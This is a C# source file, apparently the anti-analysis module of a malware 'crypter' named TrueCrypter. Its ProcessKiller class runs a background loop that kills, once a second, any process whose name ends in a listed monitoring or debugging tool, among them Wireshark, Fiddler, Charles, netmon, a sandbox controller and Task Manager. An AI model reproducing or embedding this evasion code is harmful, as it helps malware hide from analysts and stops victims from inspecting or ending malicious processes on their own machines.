using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;

namespace TrueCrypter.Antis;

public class ProcessKiller
{
	private readonly string[] _processes = new string[8] { "antilogger", "wireshark", "charles", "fiddler", "netmon", "reflector", "sbiectrl", "taskmgr" };

	private Thread KillThread;

	private bool isWorking;

	public ProcessKiller()
	{
		KillThread = new Thread(KillMethod);
		KillThread.IsBackground = true;
		isWorking = false;
		KillThread.Start();
	}

	public void Start()
	{
		isWorking = true;
	}

	public void Stop()
	{
		isWorking = false;
	}

	private void KillMethod()
	{
		while (true)
		{
			if (!isWorking)
			{
				continue;
			}
			IEnumerable<Process> enumerable = from pr in Process.GetProcesses()
				where _processes.Any((string n) => pr.ProcessName.ToLower().EndsWith(n))
				select pr;
			foreach (Process item in enumerable)
			{
				item.Kill();
			}
			Thread.Sleep(1000);
		}
	}
}
